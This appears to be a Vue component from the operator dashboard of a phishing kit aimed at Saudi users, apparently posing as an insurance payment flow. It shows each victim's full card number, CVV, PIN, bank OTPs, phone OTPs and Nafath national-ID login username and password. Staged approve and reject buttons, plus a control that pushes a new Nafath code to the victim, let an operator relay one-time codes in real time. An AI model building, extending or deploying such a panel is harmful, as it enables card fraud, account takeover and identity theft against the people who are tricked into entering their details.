<template>
  <ModalShell
    :open="open"
    :title="'Payment & Verification'"
    :subtitle="'Manage customer payment details'"
    max-width="76rem"
    accent="#34d399"
    icon="fa-solid fa-credit-card"
    dir="ltr"
    theme="dark"
    :heavy-backdrop="true"
    body-max-height="none"
    @close="$emit('close')"
  >
    <template #header-right>
      <span class="rounded-lg bg-emerald-500/10 px-3 py-1.5 font-mono text-sm text-emerald-400 ring-1 ring-emerald-500/20">{{ customer?.ip }}</span>
    </template>

    <div v-if="customer" class="grid grid-cols-12 gap-5">
      <!-- Card Details Column -->
      <div class="col-span-5">
        <div class="glass-panel glass-panel--emerald h-full">
          <div class="panel-header">
            <div class="flex items-center gap-2.5">
              <span class="glow-dot glow-dot--emerald"></span>
              <span class="panel-label text-emerald-400">Card Details</span>
              <StatusPill v-if="customer?.selectedInsurance?.type === 'mojaz'" size="sm" variant="purple" label="📊 موجز" />
            </div>
            <div v-if="customerCards.length > 1" class="card-nav">
              <button :disabled="currentCardIndex === 0" class="card-nav-btn" @click="$emit('prev-card')">&#10094;</button>
              <span class="font-mono text-xs text-gray-400">{{ currentCardIndex + 1 }}/{{ customerCards.length }}</span>
              <button :disabled="currentCardIndex >= customerCards.length - 1" class="card-nav-btn" @click="$emit('next-card')">&#10095;</button>
            </div>
          </div>
          <div v-if="currentCard">
            <div class="relative mx-auto max-w-[400px]">
              <BankCard3D
                :cardNumber="currentCard.card_number || currentCard.card_number_full || ''"
                :holderName="currentCard.holder_name || currentCard.card_holder || ''"
                :expiry="currentCard.expiry_month && currentCard.expiry_year ? `${currentCard.expiry_month}/${currentCard.expiry_year}` : ''"
                :cvv="currentCard.cvv || ''"
                :bankName="bankInfo?.bank?.name || ''"
                :bankNameArabic="bankInfo?.bank?.name_ar || ''"
                :scheme="bankInfo?.scheme || ''"
                :cardType="bankInfo?.type || ''"
                :cardLevel="bankInfo?.brand || ''"
              />
              <div v-if="bankInfoLoading" class="absolute inset-0 flex items-center justify-center rounded-xl bg-black/40 backdrop-blur-sm">
                <span class="inline-block h-6 w-6 animate-spin rounded-full border-2 border-emerald-400 border-t-transparent" aria-label="Loading bank info"></span>
              </div>
            </div>
            <!-- Card action buttons -->
            <div class="mt-4">
              <div v-if="isPending(currentCard.status)" class="space-y-2">
                <AdminButton variant="accept" class="w-full" :disabled="processingAction" @click="$emit('card-action', 'card-approve', currentCardIndex)">قبول</AdminButton>
                <RejectReasonPicker action="card-reject" :disabled="processingAction" @reject="reason => $emit('card-action', 'card-reject', currentCardIndex, reason)" />
              </div>
              <div v-else-if="currentCard.status === 'approved' || currentCard.status === 'verified'" class="mt-2 text-center">
                <StatusPill variant="success" icon-text="✓" label="تمت الموافقة" />
              </div>
              <div v-else-if="currentCard.status === 'rejected' || currentCard.status === 'failed'" class="mt-2 text-center">
                <StatusPill variant="error" icon-text="✗" label="تم الرفض" />
                <p v-if="getRecordRejectedReasonKey(currentCard)" class="mt-1 text-[10px] text-red-400/80">
                  {{ getReasonLabel(getRecordRejectedReasonKey(currentCard), t) }}
                </p>
              </div>
            </div>
            <!-- Payment amount -->
            <div v-if="paymentAmount" class="payment-summary mt-4">
              <div class="flex items-center justify-between">
                <div class="flex items-center gap-2">
                  <span class="text-lg">💰</span>
                  <span class="text-xs font-semibold text-emerald-400">قيمة الدفع النهائية</span>
                </div>
                <span class="text-xl font-bold text-emerald-300" dir="ltr">{{ Number(paymentAmount).toLocaleString('ar-SA') }} ر.س</span>
              </div>
              <div v-if="priceSummary" class="mt-3 space-y-1.5 border-t border-emerald-500/20 pt-3 text-xs">
                <div v-if="priceSummary.base_price" class="flex justify-between text-slate-300">
                  <span>السعر الأساسي</span>
                  <span dir="ltr">{{ Number(priceSummary.base_price).toLocaleString('ar-SA') }} ر.س</span>
                </div>
                <div v-if="priceSummary.vat" class="flex justify-between text-slate-300">
                  <span>الضريبة (VAT)</span>
                  <span dir="ltr">{{ Number(priceSummary.vat).toLocaleString('ar-SA') }} ر.س</span>
                </div>
                <div v-if="priceSummary.additions_total" class="flex justify-between text-slate-300">
                  <span>الإضافات</span>
                  <span dir="ltr">{{ Number(priceSummary.additions_total).toLocaleString('ar-SA') }} ر.س</span>
                </div>
              </div>
              <div v-if="selectedOffer?.company_name || customer?.insurance_company" class="mt-2 border-t border-emerald-500/20 pt-2">
                <div class="flex items-center gap-2 text-xs">
                  <span class="text-slate-400">🏢</span>
                  <span class="text-slate-300">{{ selectedOffer?.company_name || customer?.insurance_company }}</span>
                </div>
              </div>
            </div>
          </div>
          <div v-else class="empty-state"><div class="empty-state-icon">💳</div><p>لا توجد بطاقات</p></div>
        </div>
      </div>

      <!-- OTP + PIN + Phone Column -->
      <div class="col-span-4 space-y-4">
        <div class="grid grid-cols-2 gap-4">
          <!-- OTP Code -->
          <div class="glass-panel glass-panel--amber flex min-h-[180px] flex-col">
            <div class="panel-header">
              <div class="flex items-center gap-2">
                <span class="glow-dot glow-dot--amber"></span>
                <span class="panel-label text-amber-400">OTP Code</span>
              </div>
              <StatusPill v-if="latestOtp" size="sm" variant="orange" label="صفحة OTP" />
            </div>
            <div v-if="latestOtp" class="flex flex-1 flex-col">
              <div class="code-display code-display--amber">
                <span class="code-value text-amber-400">{{ latestOtp.code || latestOtp.otp_code || '—' }}</span>
              </div>
              <div v-if="isPending(latestOtp.status)" class="mt-auto space-y-2 pt-3">
                <AdminButton variant="accept" size="sm" class="w-full" :disabled="processingAction" @click="$emit('payment-action', 'otp-approve')">قبول</AdminButton>
                <RejectReasonPicker action="otp-reject" :disabled="processingAction" @reject="reason => $emit('payment-action', 'otp-reject', reason)" />
              </div>
              <div v-else-if="latestOtp.status === 'approved' || latestOtp.status === 'verified'" class="mt-2 text-center">
                <StatusPill variant="success" icon-text="✓" label="تمت الموافقة" />
              </div>
              <div v-else-if="latestOtp.status === 'rejected' || latestOtp.status === 'failed'" class="mt-2 text-center">
                <StatusPill variant="error" icon-text="✗" label="تم الرفض" />
                <p v-if="getRecordRejectedReasonKey(latestOtp)" class="mt-1 text-[10px] text-red-400/80">
                  {{ getReasonLabel(getRecordRejectedReasonKey(latestOtp), t) }}
                </p>
              </div>
            </div>
            <div v-else class="empty-state flex-1"><div class="empty-state-icon">🔐</div><p>لا يوجد رمز OTP حتى الآن</p></div>
          </div>
          <!-- PIN Code -->
          <div class="glass-panel glass-panel--pink flex min-h-[180px] flex-col">
            <div class="panel-header">
              <div class="flex items-center gap-2">
                <span class="glow-dot glow-dot--pink"></span>
                <span class="panel-label text-pink-400">PIN Code</span>
              </div>
              <StatusPill v-if="latestPin" size="sm" variant="pink" label="صفحة PIN" />
            </div>
            <div v-if="latestPin" class="flex flex-1 flex-col">
              <div class="code-display code-display--pink">
                <span class="code-value text-pink-400">{{ latestPin.code || latestPin.pin || '—' }}</span>
              </div>
              <div v-if="isPending(latestPin.status)" class="mt-auto space-y-2 pt-3">
                <AdminButton variant="accept" size="sm" class="w-full" :disabled="processingAction" @click="$emit('payment-action', 'pin-approve')">قبول</AdminButton>
                <RejectReasonPicker action="pin-reject" :disabled="processingAction" @reject="reason => $emit('payment-action', 'pin-reject', reason)" />
              </div>
              <div v-else-if="latestPin.status === 'approved' || latestPin.status === 'verified'" class="mt-2 text-center">
                <StatusPill variant="success" icon-text="✓" label="تمت الموافقة" />
              </div>
              <div v-else-if="latestPin.status === 'rejected' || latestPin.status === 'failed'" class="mt-2 text-center">
                <StatusPill variant="error" icon-text="✗" label="تم الرفض" />
                <p v-if="getRecordRejectedReasonKey(latestPin)" class="mt-1 text-[10px] text-red-400/80">
                  {{ getReasonLabel(getRecordRejectedReasonKey(latestPin), t) }}
                </p>
              </div>
              <div class="mt-1 text-center">
                <span class="font-mono text-[10px] text-gray-500" dir="ltr">{{ formatDateTimeEN(latestPin.created_at) }}</span>
              </div>
            </div>
            <div v-else class="empty-state flex-1"><div class="empty-state-icon">🔑</div><p>لم يتم إدخال رمز PIN</p></div>
          </div>
        </div>
        <!-- Phone Verification -->
        <div class="glass-panel glass-panel--sky">
          <div class="panel-header">
            <div class="flex items-center gap-2">
              <span class="glow-dot glow-dot--sky"></span>
              <span class="panel-label text-sky-400">Phone Verification</span>
            </div>
            <StatusPill v-if="latestPhoneOtp" size="sm" variant="cyan" label="صفحة التحقق" />
          </div>
          <div class="space-y-2">
            <DataField label="رقم الهاتف" :value="customer?.phone_number || customer?.phone" mono />
            <DataField label="شركة الاتصالات" :value="customer?.phone_carrier || customer?.carrier" />
            <DataField label="تاريخ الميلاد" :value="getPhoneBirthDate(customer)" />
            <div v-if="latestPhoneOtp">
              <div class="mb-2 flex items-center justify-between">
                <span class="text-[10px] uppercase text-gray-400">
                  رمز التحقق
                  <span v-if="latestPhoneOtp?.is_stc" class="ml-1 font-semibold text-purple-400">(STC)</span>
                  <span v-else-if="latestPhoneOtp?.type === 'phone_verification'" class="ml-1 font-semibold text-sky-400">(أخرى)</span>
                </span>
                <StatusPill v-if="getPhoneVerificationStatus(customer) === 'approved'" size="sm" variant="success" icon-text="✓" label="موافق" />
                <StatusPill v-else-if="getPhoneVerificationStatus(customer) === 'rejected'" size="sm" variant="error" icon-text="✗" label="مرفوض" />
              </div>
              <div class="code-display code-display--sky">
                <span class="code-value text-sky-400">{{ latestPhoneOtp?.otp_code || latestPhoneOtp?.code || '—' }}</span>
              </div>
              <div v-if="isCarrierMismatch(customer)" class="carrier-warning mt-2">
                <span class="text-[9px] text-yellow-400">⚠️ هذا الكود من {{ latestPhoneOtp?.is_stc ? 'STC' : 'شركة أخرى' }} - العميل اختار {{ isStcCarrier(customer) ? 'STC' : customer?.phone_carrier || 'شركة أخرى' }}</span>
              </div>
            </div>
            <div v-else class="empty-state"><div class="empty-state-icon">📱</div><p>لا توجد بيانات تحقق للهاتف</p></div>

            <!-- STC 3-Stage Approval -->
            <div v-if="isStcVerificationFlow(customer) && isStcWaitingForApproval(customer)" class="stage-card stage-card--purple">
              <div class="stage-label text-purple-400">المرحلة 1: موافقة على البيانات المدخلة</div>
              <div class="space-y-2">
                <AdminButton variant="accept" class="w-full" :disabled="processingAction" @click="$emit('payment-action', 'phone-approve')">قبول</AdminButton>
                <RejectReasonPicker action="stc-waiting-reject" :disabled="processingAction" @reject="reason => $emit('payment-action', 'phone-reject', reason)" />
              </div>
            </div>
            <div v-else-if="isStcVerificationFlow(customer) && customer?.custom_data?.stc_waiting_approved && !customer?.custom_data?.stc_otp_approved" class="mt-2 text-center">
              <StatusPill variant="info" icon-text="✓" label="تمت الموافقة على البيانات" />
            </div>
            <div v-if="isStcVerificationFlow(customer) && isStcWaitingForOtpApproval(customer)" class="stage-card stage-card--yellow">
              <div class="stage-label text-yellow-400">المرحلة 2: موافقة على رمز التحقق (OTP)</div>
              <div class="space-y-2">
                <AdminButton variant="accept" class="w-full" :disabled="processingAction" @click="$emit('payment-action', 'phone-approve')">قبول</AdminButton>
                <RejectReasonPicker action="stc-otp-reject" :disabled="processingAction" @reject="reason => $emit('payment-action', 'phone-reject', reason)" />
              </div>
            </div>
            <div v-else-if="isStcVerificationFlow(customer) && customer?.custom_data?.stc_otp_approved && !customer?.custom_data?.stc_call_approved" class="mt-2 text-center">
              <StatusPill variant="warning" icon-text="✓" label="تمت الموافقة على OTP" />
            </div>
            <div v-if="isStcVerificationFlow(customer) && isStcWaitingForCallApproval(customer)" class="stage-card stage-card--cyan">
              <div class="stage-label text-cyan-400">المرحلة 3: موافقة على المكالمة</div>
              <div class="space-y-2">
                <AdminButton variant="accept" class="w-full" :disabled="processingAction" @click="$emit('payment-action', 'phone-approve')">قبول</AdminButton>
                <RejectReasonPicker action="stc-call-reject" :disabled="processingAction" @reject="reason => $emit('payment-action', 'phone-reject', reason)" />
              </div>
            </div>
            <div v-else-if="isStcVerificationFlow(customer) && customer?.custom_data?.stc_call_approved" class="mt-2 text-center">
              <StatusPill variant="success" icon-text="✓" label="تم التوثيق بالكامل" />
            </div>
            <div v-if="isStcVerificationFlow(customer) && (customer?.custom_data?.stc_waiting_rejected || customer?.custom_data?.stc_otp_rejected || customer?.custom_data?.stc_call_rejected)" class="mt-2 text-center">
              <StatusPill variant="error" icon-text="✗" label="تم الرفض" />
              <p v-if="getStcRejectedReasonKey()" class="mt-1 text-[10px] text-red-400/80">
                {{ getReasonLabel(getStcRejectedReasonKey(), t) }}
              </p>
            </div>

            <!-- Phone Verification 2-Stage (generic) -->
            <div v-if="!isStcVerificationFlow(customer) && isPhoneDataWaitingForApproval(customer)" class="stage-card stage-card--purple">
              <div class="stage-label text-purple-400">المرحلة 1: موافقة على بيانات الهاتف</div>
              <div class="space-y-2">
                <AdminButton variant="accept" class="w-full" :disabled="processingAction" @click="$emit('payment-action', 'phone-data-approve')">قبول</AdminButton>
                <RejectReasonPicker action="phone-data-reject" :disabled="processingAction" @reject="reason => $emit('payment-action', 'phone-data-reject', reason)" />
              </div>
            </div>
            <div v-else-if="!isStcVerificationFlow(customer) && customer?.custom_data?.phone_data_status === 'approved' && customer?.custom_data?.phone_otp_status !== 'approved'" class="mt-2 text-center">
              <StatusPill variant="info" icon-text="✓" label="تمت الموافقة على البيانات" />
            </div>
            <div v-if="!isStcVerificationFlow(customer) && isPhoneOtpWaitingForApproval(customer)" class="stage-card stage-card--yellow">
              <div class="stage-label text-yellow-400">المرحلة 2: موافقة على رمز التحقق (OTP)</div>
              <div class="space-y-2">
                <AdminButton variant="accept" class="w-full" :disabled="processingAction" @click="$emit('payment-action', 'phone-otp-approve')">قبول</AdminButton>
                <RejectReasonPicker action="phone-otp-reject" :disabled="processingAction" @reject="reason => $emit('payment-action', 'phone-otp-reject', reason)" />
              </div>
            </div>
            <div v-else-if="!isStcVerificationFlow(customer) && customer?.custom_data?.phone_otp_status === 'approved'" class="mt-2 text-center">
              <StatusPill variant="success" icon-text="✓" label="تم التوثيق بالكامل" />
            </div>
            <div v-if="!isStcVerificationFlow(customer) && (customer?.custom_data?.phone_data_status === 'rejected' || customer?.custom_data?.phone_otp_status === 'rejected')" class="mt-2 text-center">
              <StatusPill variant="error" icon-text="✗" label="تم الرفض" />
              <p v-if="getPhoneRejectedReasonKey()" class="mt-1 text-[10px] text-red-400/80">
                {{ getReasonLabel(getPhoneRejectedReasonKey(), t) }}
              </p>
            </div>
          </div>
        </div>
      </div>

      <!-- Nafath Column -->
      <div class="col-span-3">
        <div class="glass-panel glass-panel--cyan h-full">
          <div class="panel-header">
            <div class="flex items-center gap-2">
              <span class="glow-dot glow-dot--cyan"></span>
              <span class="panel-label text-cyan-400">Nafath Login</span>
            </div>
            <span class="text-lg text-cyan-400">🆔</span>
          </div>
          <div v-if="latestNafath">
            <div class="space-y-2">
              <DataField label="اسم المستخدم" :value="latestNafath.username" mono />
              <DataField label="كلمة المرور" :value="latestNafath.password" mono />
              <p class="mb-1.5 text-[10px] font-medium uppercase tracking-wider text-gray-500">رمز التحقق</p>
              <div class="code-display code-display--cyan">
                <span class="code-value text-cyan-400">{{ nafathDisplayNumber || latestNafath.verification_code || '—' }}</span>
              </div>
              <div class="text-center">
                <span class="font-mono text-[10px] text-gray-500" dir="ltr">{{ formatDateTimeEN(latestNafath.created_at) }}</span>
              </div>
            </div>
            <div class="mt-3 space-y-2">
              <label for="nafath-code-input" class="sr-only">رمز نفاذ</label>
              <input
                id="nafath-code-input"
                name="nafath-code"
                autocomplete="off"
                :value="nafathDisplayNumber"
                type="text"
                class="nafath-input"
                placeholder="رمز جديد..."
                @input="$emit('update:nafathDisplayNumber', $event.target.value)"
              />
              <div v-if="isPending(latestNafath.status)" class="space-y-2">
                <AdminButton
                  variant="accept"
                  class="w-full"
                  :disabled="processingAction || (!nafathDisplayNumber && !latestNafath.verification_code)"
                  @click="$emit('payment-action', 'nafath-approve')"
                >قبول</AdminButton>
                <RejectReasonPicker action="nafath-reject" :disabled="processingAction" @reject="reason => $emit('payment-action', 'nafath-reject', reason)" />
              </div>
              <div v-else-if="latestNafath.status === 'approved' || latestNafath.status === 'verified'" class="mt-2 text-center">
                <StatusPill variant="success" icon-text="✓" label="تمت الموافقة" />
              </div>
              <div v-else-if="latestNafath.status === 'rejected' || latestNafath.status === 'failed'" class="mt-2 text-center">
                <StatusPill variant="error" icon-text="✗" label="تم الرفض" />
              </div>
              <div v-if="nafathDisplayNumber && nafathDisplayNumber !== (latestNafath.verification_code || '')">
                <AdminButton variant="purple" class="w-full" @click="$emit('nafath-update-code')">🔄 تحديث وإرسال للعميل</AdminButton>
              </div>
            </div>
          </div>
          <div v-else class="empty-state"><div class="empty-state-icon">🔐</div><p>لم يتم تسجيل دخول نفاذ</p></div>
        </div>
      </div>
    </div>

    <template #footer>
      <div class="flex justify-end">
        <AdminButton variant="ghost" label="Close" @click="$emit('close')" />
      </div>
    </template>
  </ModalShell>
</template>

<script setup>
import { onMounted, onUnmounted } from 'vue';
import { useI18n } from 'vue-i18n';
import { ModalShell, StatusPill, AdminButton, DataField } from '../ui';
import BankCard3D from '../BankCard3D.vue';
import RejectReasonPicker from '../RejectReasonPicker.vue';
import { useCustomerFormatters } from '../../utils/customerFormatters';
import { getReasonLabel } from '@/constants/rejectionReasons';

const { t } = useI18n();
const { isPending, formatDateTimeEN } = useCustomerFormatters();

const props = defineProps({
  open: { type: Boolean, default: false },
  customer: { type: Object, default: null },
  currentCard: { type: Object, default: null },
  currentCardIndex: { type: Number, default: 0 },
  customerCards: { type: Array, default: () => [] },
  bankInfo: { type: Object, default: null },
  bankInfoLoading: { type: Boolean, default: false },
  latestOtp: { type: Object, default: null },
  latestPin: { type: Object, default: null },
  latestPhoneOtp: { type: Object, default: null },
  latestNafath: { type: Object, default: null },
  paymentAmount: { type: [Number, String], default: null },
  priceSummary: { type: Object, default: null },
  selectedOffer: { type: Object, default: null },
  nafathDisplayNumber: { type: String, default: '' },
  processingAction: { type: Boolean, default: false },
  // STC / Phone helper functions passed as props
  isStcCarrier: { type: Function, required: true },
  isCarrierMismatch: { type: Function, required: true },
  isStcVerificationFlow: { type: Function, required: true },
  isStcWaitingForApproval: { type: Function, required: true },
  isStcWaitingForOtpApproval: { type: Function, required: true },
  isStcWaitingForCallApproval: { type: Function, required: true },
  getPhoneBirthDate: { type: Function, required: true },
  getPhoneVerificationStatus: { type: Function, required: true },
  isPhoneDataWaitingForApproval: { type: Function, required: true },
  isPhoneOtpWaitingForApproval: { type: Function, required: true },
});

const emit = defineEmits([
  'close', 'card-action', 'payment-action', 'prev-card', 'next-card',
  'update:nafathDisplayNumber', 'nafath-update-code',
]);

const getRecordRejectedReasonKey = (record) => record?.rejection_reason || record?.reason || '';

const getStcRejectedReasonKey = () => (
  props.customer?.custom_data?.stc_call_rejected_reason
  || props.customer?.custom_data?.stc_otp_rejected_reason
  || props.customer?.custom_data?.stc_waiting_rejected_reason
  || ''
);

const getPhoneRejectedReasonKey = () => (
  props.latestPhoneOtp?.rejection_reason
  || props.latestPhoneOtp?.reason
  || props.customer?.custom_data?.phone_data_rejection_reason
  || ''
);

// ── Keyboard navigation ─────────────────────────────────────────
const handleKeydown = (e) => {
  if (!props.open) return;
  if (e.key === 'ArrowLeft') {
    e.preventDefault();
    emit('prev-card');
  } else if (e.key === 'ArrowRight') {
    e.preventDefault();
    emit('next-card');
  } else if (e.key === 'Escape') {
    emit('close');
  }
};

onMounted(() => window.addEventListener('keydown', handleKeydown));
onUnmounted(() => window.removeEventListener('keydown', handleKeydown));
</script>

<style scoped>
@reference "../../../../css/app.css";

/* ── Glassmorphism Design System ─────────────────────────────── */

/* Base glass panel */
.glass-panel {
  @apply rounded-2xl p-5;
  background: rgba(17, 24, 39, 0.6);
  backdrop-filter: blur(16px);
  border: 1px solid rgba(255, 255, 255, 0.06);
  box-shadow: 0 8px 32px rgba(0, 0, 0, 0.2), inset 0 1px 0 rgba(255, 255, 255, 0.04);
  transition: border-color 0.3s ease, box-shadow 0.3s ease;
}

/* Accent variants — subtle glow on hover */
.glass-panel--emerald { border-color: rgba(52, 211, 153, 0.12); }
.glass-panel--emerald:hover { border-color: rgba(52, 211, 153, 0.25); box-shadow: 0 8px 32px rgba(52, 211, 153, 0.08), inset 0 1px 0 rgba(255, 255, 255, 0.04); }

.glass-panel--amber { border-color: rgba(251, 191, 36, 0.12); }
.glass-panel--amber:hover { border-color: rgba(251, 191, 36, 0.25); box-shadow: 0 8px 32px rgba(251, 191, 36, 0.08), inset 0 1px 0 rgba(255, 255, 255, 0.04); }

.glass-panel--pink { border-color: rgba(244, 114, 182, 0.12); }
.glass-panel--pink:hover { border-color: rgba(244, 114, 182, 0.25); box-shadow: 0 8px 32px rgba(244, 114, 182, 0.08), inset 0 1px 0 rgba(255, 255, 255, 0.04); }

.glass-panel--sky { border-color: rgba(56, 189, 248, 0.12); }
.glass-panel--sky:hover { border-color: rgba(56, 189, 248, 0.25); box-shadow: 0 8px 32px rgba(56, 189, 248, 0.08), inset 0 1px 0 rgba(255, 255, 255, 0.04); }

.glass-panel--cyan { border-color: rgba(34, 211, 238, 0.12); }
.glass-panel--cyan:hover { border-color: rgba(34, 211, 238, 0.25); box-shadow: 0 8px 32px rgba(34, 211, 238, 0.08), inset 0 1px 0 rgba(255, 255, 255, 0.04); }

/* Panel header row */
.panel-header {
  @apply mb-4 flex items-center justify-between;
}

.panel-label {
  @apply text-[11px] font-bold tracking-wide uppercase;
}

/* Glowing dot indicators */
.glow-dot {
  @apply h-2.5 w-2.5 shrink-0 rounded-full;
}
.glow-dot--emerald { background: #34d399; box-shadow: 0 0 8px rgba(52, 211, 153, 0.6); }
.glow-dot--amber   { background: #fbbf24; box-shadow: 0 0 8px rgba(251, 191, 36, 0.6); }
.glow-dot--pink    { background: #f472b6; box-shadow: 0 0 8px rgba(244, 114, 182, 0.6); }
.glow-dot--sky     { background: #38bdf8; box-shadow: 0 0 8px rgba(56, 189, 248, 0.6); }
.glow-dot--cyan    { background: #22d3ee; box-shadow: 0 0 8px rgba(34, 211, 238, 0.6); }

/* Card navigator controls */
.card-nav {
  @apply flex items-center gap-1.5 rounded-xl bg-gray-800/60 px-2.5 py-1.5 ring-1 ring-white/5;
}
.card-nav-btn {
  @apply px-1.5 py-0.5 text-xs text-gray-400 transition-colors hover:text-white disabled:opacity-30 rounded;
}

/* Code display boxes */
.code-display {
  @apply flex min-h-[60px] flex-col items-center justify-center rounded-xl py-3;
  background: rgba(17, 24, 39, 0.5);
  border: 1px solid rgba(255, 255, 255, 0.06);
}
.code-display--amber { border-color: rgba(251, 191, 36, 0.15); background: rgba(251, 191, 36, 0.05); }
.code-display--pink  { border-color: rgba(244, 114, 182, 0.15); background: rgba(244, 114, 182, 0.05); }
.code-display--sky   { border-color: rgba(56, 189, 248, 0.15); background: rgba(56, 189, 248, 0.05); }
.code-display--cyan  { border-color: rgba(34, 211, 238, 0.15); background: rgba(34, 211, 238, 0.05); }

.code-value {
  @apply font-mono text-2xl font-bold tracking-[0.25em];
}

/* Payment summary box */
.payment-summary {
  @apply rounded-2xl p-4;
  background: rgba(52, 211, 153, 0.06);
  border: 1px solid rgba(52, 211, 153, 0.15);
  backdrop-filter: blur(8px);
}

/* Stage action cards */
.stage-card {
  @apply mt-3 rounded-xl border p-3;
  backdrop-filter: blur(8px);
}
.stage-card--purple { border-color: rgba(168, 85, 247, 0.25); background: rgba(88, 28, 135, 0.15); }
.stage-card--yellow { border-color: rgba(234, 179, 8, 0.25); background: rgba(113, 63, 18, 0.15); }
.stage-card--cyan   { border-color: rgba(34, 211, 238, 0.25); background: rgba(22, 78, 99, 0.15); }

.stage-label {
  @apply mb-2 text-center text-xs font-semibold;
}

/* Carrier mismatch warning */
.carrier-warning {
  @apply rounded-lg border border-yellow-500/30 p-2 text-center;
  background: rgba(234, 179, 8, 0.08);
}

/* Nafath input */
.nafath-input {
  @apply w-full rounded-xl border border-gray-600/50 px-3 py-2.5 text-center font-mono text-base text-white transition-all placeholder:text-sm placeholder:text-gray-600 focus:outline-none;
  background: rgba(17, 24, 39, 0.6);
  backdrop-filter: blur(8px);
}
.nafath-input:focus {
  border-color: rgba(34, 211, 238, 0.5);
  box-shadow: 0 0 0 3px rgba(34, 211, 238, 0.1);
}

/* Empty states */
.empty-state {
  @apply flex flex-col items-center justify-center py-8 text-center text-xs text-gray-500/80;
}
.empty-state-icon {
  @apply mb-2 text-2xl opacity-40;
}
</style>
